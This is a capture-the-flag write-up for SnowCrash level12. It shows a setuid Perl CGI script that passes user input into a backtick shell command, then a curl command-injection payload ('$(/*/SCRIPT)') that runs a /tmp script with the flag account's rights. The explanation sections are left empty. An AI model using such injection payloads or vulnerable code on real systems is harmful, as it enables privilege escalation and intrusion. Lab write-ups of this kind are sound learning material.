# LEVEL12

## 1. Inspect The Home Directory

```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```



## 2. 

```bash
level12@SnowCrash:~$ echo << EOF > /tmp/SCRIPT
> #!/bin/bash
> getflag > /tmp/getflag
> EOF
level12@SnowCrash:~$ chmod +x /tmp/SCRIPT
level12@SnowCrash:~$ curl http://localhost:4646/level12.pl?x=`$(/*/SCRIPT)`
..level12@SnowCrash:~$ cat /tmp/getflag
Check flag.Here is your token : XXX
```
**Payload explanation:**
>- `` 				: 
>- `` 				: 
>- `` 				: 
>- `` 				: 


**Explanation:**
>- `` 				: 
>- `` 				: 
>- `` 				: 
>- `` 				: 

## 3. Alternative `curl`

```
level12@SnowCrash:~$ curl http://localhost:4646/level12.pl?x='$(/*/script)'
level12@SnowCrash:~$ curl localhost:4646/level12.pl?x='$(/*/script)'
level12@SnowCrash:~$ curl localhost:4646?x='$(/*/script)'
```